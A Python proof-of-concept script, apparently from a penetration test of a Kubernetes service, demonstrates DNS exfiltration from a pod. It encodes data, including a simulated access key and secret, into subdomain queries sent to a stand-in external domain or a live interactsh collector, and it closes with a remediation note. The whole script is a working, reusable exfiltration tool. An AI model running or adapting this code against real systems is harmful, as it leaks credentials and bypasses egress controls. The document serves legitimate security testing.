#!/usr/bin/env python3
"""
DNS Exfiltration PoC — Method 1: Direct Pod DNS Egress
Demonstrates that code running inside a user pod can resolve
external DNS names, bypassing HTTP/HTTPS egress controls.

Evidence: RTT > 100ms proves the query left the cluster.
"""

import socket
import base64
import time

# ── Config ────────────────────────────────────────────────
# Use interactsh.com for a live PoC — register at
# https://app.interactsh.com to get your own subdomain
# and see queries arrive in real time.
INTERACTSH_DOMAIN = "YOUR_CODE.oast.fun"   # replace with yours
FALLBACK_DOMAIN   = "pentest-dns-exfil.example.com"

def encode_payload(data: bytes) -> str:
    """Encode bytes as DNS-safe base64 (no =, +, /)"""
    b64 = base64.b64encode(data).decode()
    return (b64.replace("=", "")
               .replace("+", "-")
               .replace("/", "_"))

def exfil_via_dns(payload: bytes, domain: str) -> dict:
    """
    Encode payload as a DNS subdomain query.
    The subdomain carries the data; an external DNS server
    logs the query even if it returns NXDOMAIN.
    """
    encoded   = encode_payload(payload)
    hostname  = f"{encoded}.{domain}"

    print(f"  Payload:  {payload}")
    print(f"  Encoded:  {encoded}")
    print(f"  Query:    {hostname}")

    start = time.time()
    try:
        ip = socket.gethostbyname(hostname)
        resolved = True
        print(f"  Resolved: {ip}")
    except socket.gaierror as e:
        resolved = False
        print(f"  Result:   NXDOMAIN ({e})")
        print(f"  (NXDOMAIN is fine — query still LEFT the pod)")
    elapsed_ms = (time.time() - start) * 1000

    external = elapsed_ms > 100   # internal DNS < 5ms
    print(f"  RTT:      {elapsed_ms:.0f}ms")
    print(f"  Verdict:  {'EXTERNAL DNS REACHED' if external else 'INTERNAL ONLY'}")
    return {
        "payload":    payload,
        "encoded":    encoded,
        "hostname":   hostname,
        "rtt_ms":     elapsed_ms,
        "external":   external,
        "resolved":   resolved,
    }

# ── Run ───────────────────────────────────────────────────
if __name__ == "__main__":
    print("=" * 55)
    print("  METHOD 1 — Direct DNS Egress from Pod")
    print("=" * 55)

    # Test 1: simple string
    print("\n[Test 1] Simple string payload")
    r1 = exfil_via_dns(b"Hello World from Sparrow Studio", FALLBACK_DOMAIN)

    # Test 2: simulated secret exfiltration
    print("\n[Test 2] Simulated credential exfiltration")
    secret = b"access_key=c91364&secret=4f4a8567b836c9dd"
    r2     = exfil_via_dns(secret, FALLBACK_DOMAIN)

    # Test 3: live interactsh (uncomment + set domain)
    # print("\n[Test 3] Live — check app.interactsh.com")
    # r3 = exfil_via_dns(b"live-exfil-test", INTERACTSH_DOMAIN)

    print("\n" + "=" * 55)
    print("  SUMMARY")
    print("=" * 55)
    for label, r in [("Test 1", r1), ("Test 2", r2)]:
        status = "CONFIRMED EXTERNAL" if r["external"] else "internal only"
        print(f"  {label}: RTT={r['rtt_ms']:.0f}ms  →  {status}")

    print("""
  Fix: implement a DNS firewall (RPZ) or restrict pod
  egress to the cluster-internal DNS resolver only,
  blocking resolution of external domains.
""")
